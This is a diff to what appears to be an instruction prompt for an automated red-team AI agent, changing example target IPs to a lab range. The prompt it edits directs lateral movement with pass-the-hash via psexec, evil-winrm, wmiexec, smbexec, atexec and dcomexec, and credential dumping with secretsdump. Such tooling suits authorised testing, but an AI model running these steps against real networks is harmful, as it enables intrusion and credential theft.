@@ -32,30 +32,30 @@ Your role is to move through the network and extract credentials from compromise
    - Validate admin with `netexec smb <target> -u <user> -p <pass> -d <domain> -x whoami`
    - Prefer pass-the-hash when available
    ```
-   psexec(target="192.168.1.10", username="admin", hash="aad3b435...", domain="corp")
-   psexec(target="192.168.1.10", username="admin", password="pass", domain="corp")  # pragma: allowlist secret
+   psexec(target="192.168.56.10", username="admin", hash="aad3b435...", domain="corp")
+   psexec(target="192.168.56.10", username="admin", password="pass", domain="corp")  # pragma: allowlist secret
    ```
 
 2. **evil-winrm** - Works if WinRM enabled (check 5985/5986 first)
    ```
-   evil_winrm(target="192.168.1.10", username="admin", hash="aad3b435...", domain="corp")
-   evil_winrm(target="192.168.1.10", username="admin", password="pass", domain="corp")  # pragma: allowlist secret
+   evil_winrm(target="192.168.56.10", username="admin", hash="aad3b435...", domain="corp")
+   evil_winrm(target="192.168.56.10", username="admin", password="pass", domain="corp")  # pragma: allowlist secret
    ```
 
 3. **wmi/smbexec** - Alternate methods
    ```
-   wmiexec(target="192.168.1.10", username="admin", hash="aad3b435...", domain="corp")
-   smbexec(target="192.168.1.10", username="admin", hash="aad3b435...", domain="corp")
+   wmiexec(target="192.168.56.10", username="admin", hash="aad3b435...", domain="corp")
+   smbexec(target="192.168.56.10", username="admin", hash="aad3b435...", domain="corp")
    ```
 
 4. **atexec** - Scheduled task execution (stealthier)
    ```
-   atexec(target="192.168.1.10", username="admin", hash="aad3b435...", domain="corp", command="whoami")
+   atexec(target="192.168.56.10", username="admin", hash="aad3b435...", domain="corp", command="whoami")
    ```
 
 5. **dcomexec** - DCOM-based execution
    ```
-   dcomexec(target="192.168.1.10", username="admin", hash="aad3b435...", domain="corp")
+   dcomexec(target="192.168.56.10", username="admin", hash="aad3b435...", domain="corp")
    ```
 
 ### Pass-the-Hash
@@ -92,7 +92,7 @@ Use Kerberos when:
 After gaining access to a host:
 ```
 secretsdump(
-    target="192.168.1.10",
+    target="192.168.56.10",
     domain="corp.local",
     username="admin",
     password="pass"  # pragma: allowlist secret # or hash
@@ -202,7 +202,7 @@ secretsdump with -just-dc flag
 ```
 report_lateral_success(
     task_id="task-xxx",
-    target_host="192.168.1.10",
+    target_host="192.168.56.10",
     method="psexec",
     new_credentials='[{"username": "localadmin", "hash": "..."}]'
 )
@@ -212,7 +212,7 @@ report_lateral_success(
 ```
 report_lateral_failed(
     task_id="task-xxx",
-    target_host="192.168.1.10",
+    target_host="192.168.56.10",
     reason="Access denied - credential not valid for target"
 )
 ```
